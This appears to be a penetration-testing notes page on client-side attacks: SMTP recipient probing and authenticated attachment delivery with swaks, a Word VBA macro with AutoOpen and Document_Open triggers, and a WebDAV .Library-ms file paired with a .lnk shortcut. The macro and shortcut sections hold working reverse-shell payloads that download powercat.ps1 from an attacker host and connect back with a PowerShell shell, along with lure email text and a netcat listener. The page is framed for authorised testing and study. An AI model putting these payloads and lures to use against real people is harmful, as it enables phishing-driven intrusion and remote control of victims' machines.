# Client-side attacks and phishing delivery

[← Foothold quick reference](../02-foothold.md) · [Mail enumeration](../enum/mail.md) · [Net-NTLM capture](../windows/ntlm-capture.md)

Use this path when the in-scope workflow includes a person opening a document, shortcut, or mail attachment. Delivery, opening, and code execution are separate checkpoints; an SMTP `250` alone proves none of the latter two.

| Delivery path | Choose it when | Abandon or change course when |
| --- | --- | --- |
| Office VBA | Office is installed and a macro-enabled document is likely to be opened. | Internet-origin macros are blocked, policy disables macros, or the attachment is filtered. |
| WebDAV `.Library-ms` + `.lnk` | A Windows user can open a library file and then a shortcut in its WebDAV location. | WebDAV is unreachable, either file is blocked, or there is no evidence the shortcut was run. |
| SMTP | You have an accepted recipient and a permitted sender/relay path. | Authentication, recipient policy, or attachment filtering stops delivery. |
| File-induced NTLM authentication | The goal is a Net-NTLM response, not code execution, and a client can reach your listener. | Outbound SMB/HTTP is blocked or the file is not processed. See [Net-NTLM capture](../windows/ntlm-capture.md). |

## Check the mail path first

Use a valid `EHLO` hostname, then compare recipient replies for a candidate and a deliberately nonexistent address **in the served domain**. `VRFY` may be disabled. `530` means this transaction needs authentication at that point; `550 Unknown user` rejects that recipient; `250` only accepts the recipient for this transaction. If every candidate and the nonsense control return `250`, RCPT probing gives no user-enumeration signal. An external address can get `250` under different relay rules, so it is not evidence that a local mailbox exists.

```bash
swaks --server <smtp-ip> --port 587 --tls \
  --from '<sender@domain.tld>' --to '<recipient@domain.tld>' \
  --quit-after RCPT
```

If the server requires authentication, add `--auth LOGIN --auth-user '<sender@domain.tld>' --auth-password --protect-prompt --auth-hide-password`. With no password argument, Swaks uses a matching `.netrc` entry if available or prompts; confirm which credential source it used. This keeps the password out of shell history and a process argument. `--quit-after RCPT` sends **no message**. In the transcript, `->` is the client command and `<-` is the server reply.

If `MAIL FROM` with a local domain produces a different `RCPT TO` result from an external sender, record both transactions: sender/relay policy is configuration-specific. Repeat the candidate and nonsense-control comparison **after** authentication if the unauthenticated path returns `530` for both. Do not turn a single `250` into a claim that the mailbox exists.

## Authenticated SMTP delivery

Only send to an in-scope recipient. Confirm the attachment type is permitted and the listener is ready. Swaks reads an attachment from disk when its argument starts with `@`.

```bash
swaks --server <smtp-ip> --port 587 --tls \
  --auth LOGIN --auth-user '<sender@domain.tld>' \
  --auth-password --protect-prompt --auth-hide-password \
  --from '<sender@domain.tld>' --to '<recipient@domain.tld>' \
  --h-Subject 'Requested document' --body 'Please review the attached file.' \
  --attach @/path/to/allowed-file
```

If the server does not advertise STARTTLS, adjust the transport to the service actually offered; do not assume port 587 implies TLS. If Office or executable attachments are filtered, a `.docm` is not a viable mail payload. A final `250` after `DATA` means the server accepted the message, not that it reached the inbox, passed filtering, or was opened. Correlate with a unique callback or an authenticated mailbox read if available.

Pass the username and prompted password as ordinary text; Swaks performs the encoding required by `AUTH LOGIN`. Pre-encoding either value can cause a `535` authentication failure. If authentication works but `MAIL FROM` is rejected, try the address tied to the authenticated account before changing the payload. `--attach @/path/to/file` reads file contents; without `@`, Swaks may attach the literal argument. For a transcript search, inspect server `<-` lines, not the client `->` commands.

## Office VBA document

Encode a tested PowerShell command as UTF-16LE for `-EncodedCommand`. The example uses [Powercat](https://github.com/besimorhino/powercat): place `powercat.ps1` in a dedicated staging directory and serve it with `python3 -m http.server 8000 --directory /path/to/staging`. Use your own callback IP and port.

```bash
printf '%s' "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>:8000/powercat.ps1');powercat -c <KALI_IP> -p <CALLBACK_PORT> -e powershell" \
  | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

Long encoded commands need VBA-sized chunks. Replace `PASTE_BASE64_HERE` with the Base64 output; this prints assignment lines for a standard VBA module:

```bash
python3 - <<'PY'
encoded = 'PASTE_BASE64_HERE'
if encoded == 'PASTE_BASE64_HERE':
    raise SystemExit('Replace PASTE_BASE64_HERE with the generated Base64 first')
command = 'powershell.exe -NoProfile -EncodedCommand ' + encoded
for offset in range(0, len(command), 50):
    print('    cmd = cmd & "' + command[offset:offset + 50] + '"')
PY
```

In Word, place `RunPayload` and **one** open trigger in a standard module. Paste every generated `cmd = cmd & ...` line where indicated. Save as macro-enabled `.docm` (or legacy `.doc`).

```vba
Public Sub RunPayload()
    Dim cmd As String
    cmd = ""
    ' Paste generated cmd = cmd & "..." lines here.
    CreateObject("WScript.Shell").Run cmd, 0
End Sub

Sub AutoOpen()
    RunPayload
End Sub
```

Alternative: instead of `AutoOpen`, put this event in the document's `ThisDocument` module; `RunPayload` remains in the standard module. Do not use both triggers without testing for duplicate execution.

```vba
Private Sub Document_Open()
    RunPayload
End Sub
```

```bash
python3 -m http.server 8000 --directory /path/to/staging
nc -lvnp <CALLBACK_PORT>
```

Start the HTTP server and callback listener before delivery. Test in a controlled Windows/Office environment. Modern Office blocks macros from internet-origin files by default; if that policy is in effect, do not keep retrying an execution path that cannot run.

## WebDAV library and shortcut

Serve a dedicated directory with a shortcut inside it. A `.Library-ms` file points Explorer to that WebDAV location; it does **not** execute the shortcut on its own. The user must open the library and then the `.lnk`.

```bash
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/webdav --auth=anonymous
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation><url>http://ATTACKER_IP/</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Save as `Documents.Library-ms`. On a Windows staging system, create the shortcut and move the resulting `.lnk` into `/path/to/webdav` on the server. Replace the listener and callback values, and keep the Powercat script available on port 8000:

```powershell
$payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>:8000/powercat.ps1');powercat -c <KALI_IP> -p <CALLBACK_PORT> -e powershell"
$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\Review.lnk")
$lnk.TargetPath = 'powershell.exe'
$lnk.Arguments = '-NoProfile -Command "' + $payload + '"'
$lnk.Save()
```

Verify Explorer can open the library, list the WebDAV directory, and run the shortcut in a controlled test. Deliver the `.Library-ms` through an in-scope mail path or a writable share, for example:

```text
smbclient //<TARGET_IP>/<SHARE> -U <USER>
smb: \> put Documents.Library-ms
```

If the library is opened but there is no WebDAV request, troubleshoot reachability and client handling; if WebDAV is reached but there is no callback, check whether the shortcut was opened and whether its command or egress was blocked. A WebDAV request alone is not code execution.

OAuth/SAML and access-control checks from the source note live on the [web auth page](auth-and-template.md#oauth-oidc-and-saml-flows); they are distinct from phishing delivery.

References: [Swaks reference](https://www.jetmore.org/john/code/swaks/files/swaks-20240103.0/doc/ref.txt) · [Word auto macros](https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros) · [Word `Document.Open`](https://learn.microsoft.com/en-us/office/vba/api/word.document.open) · [Microsoft macro blocking](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked) · [WsgiDAV](https://github.com/mar10/wsgidav).
